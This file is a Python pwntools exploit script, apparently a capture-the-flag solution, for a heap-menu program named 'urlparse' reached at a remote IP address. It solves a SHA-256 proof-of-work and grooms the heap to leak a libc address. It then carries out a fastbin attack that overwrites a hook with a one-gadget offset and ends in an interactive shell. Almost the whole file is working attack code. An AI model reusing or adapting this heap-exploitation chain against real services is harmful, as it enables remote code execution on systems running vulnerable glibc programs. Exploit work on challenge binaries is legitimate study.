#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

__author__ = "luckasdf0"

from pwn import *
from itertools import product
from hashlib import sha256

# Settings
context.terminal = ['tmux', 'splitw', '-h']

# Global
EXEC = 0x0000555555554000

io = remote("47.75.4.252", 10013)
#io = process("./chall", env = {"LD_PRELOAD" : "./libc-2.23.so"})
#io = process("./c1c1d680-836d-4b96-8648-772ee5cd81b7.urlparse-47e10be0295a1c6c479a260239f5e0b1fd0c9696")

# gdb
def attach(addr):
    gdb.attach(io, gdbscript='b *0x%x' % (EXEC+addr))

def create(size, url):
    io.recvuntil('6: exit')
    io.sendline('1')
    io.recvuntil('size:')
    io.sendline(str(size))
    io.recvuntil('URL:')
    io.sendline(url)

def encode(idx):
    io.recvuntil('6: exit')
    io.sendline('2')
    io.recvuntil('index: ')
    io.sendline(str(idx))

def decode(idx):
    io.recvuntil('6: exit')
    io.sendline('3')
    io.recvuntil('index: ')
    io.sendline(str(idx))

def delete(idx):
    io.recvuntil('6: exit')
    io.sendline('5')
    io.recvuntil('index: ')
    io.sendline(str(idx))

def _list():
    io.recvuntil('6: exit')
    io.sendline('4')

chs = string.ascii_letters+string.digits

def proof():
    global io, chs
    io.recvuntil('xxxx+')
    s = io.recv(16)
    io.recvuntil('== ')
    d = io.recv(64)
    print s, d
    for i in product(chs, repeat=4):
        if sha256(''.join(i)+s).hexdigest() == d:
            print bytearray(i)
            res = ''.join(i)
            break
    io.sendlineafter('xxxx:', res)

proof()

create(0x100, '\x11' * 0xff)

payload = '\x11' * 13 + '%1'
create(0x10, payload)
create(0x300, '\x11' * 0x2ff)
create(0x100, 'A'*0x100)
create(0x100, 'A'*0x100)

create(0x60, 'c'*0x60)
create(0x60, 'c'*0x60)
create(0x70, 'c'*0x70)
create(0x70, 'c'*0x70)


create(0x3008-0x110*2-0x80*2-0x70*2-0x200, '\0' * (0x3007-0x110*2-0x80*2-0x70*2-0x200))
encode(8)
delete(7)
delete(6)
create(0x190, 'a'*0x190)
create(0x168, 'b'*0x165+'%F')

_list()
io.recvuntil('0: bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbaaa')
main_arena = u64(io.recv(6).ljust(0x8, '\0'))
libc_base = main_arena-0x3c4c78
log.info("main_arena 0x%016x" % main_arena)
log.info("libc_base 0x%016x" % libc_base)

delete(6)
delete(4)

create(0x300, '\0'*0x600)
create(0x300, 'A'*0x300)
delete(1)


#create(0x220, 'h'*0x215+"%F")
#_list()
#delete(0)
#create(0x218, '\0'*0x218)
#delete(0)

def urlencode(s):
    a = ''
    for i in s:
        a = a+'%'+i.encode('hex')
    return a

payload = ''
payload += p64(0x71)
payload += p64(libc_base+0x3c4aed)

create(0x2f0, 'A'*0x200+urlencode(urlencode(payload)))
decode(0)

create(0x60, 'c'*0x60)
#create(0x60, 'a'*0xb+p64(libc_base+0x0000000000045390))
create(0x60, 'a'*0xb+p64(libc_base+0xf1147))
#attach(0x103A)

io.recvuntil('6: exit')
io.sendline('1')
io.recvuntil('size:')
io.sendline(str(0x60))

#create(0x60, 'c'*0x60)

#create(0x210, 'A'*0x210)
#delete(0)
#create(0x200, 'C'*0x1fd+"%F")

io.interactive()

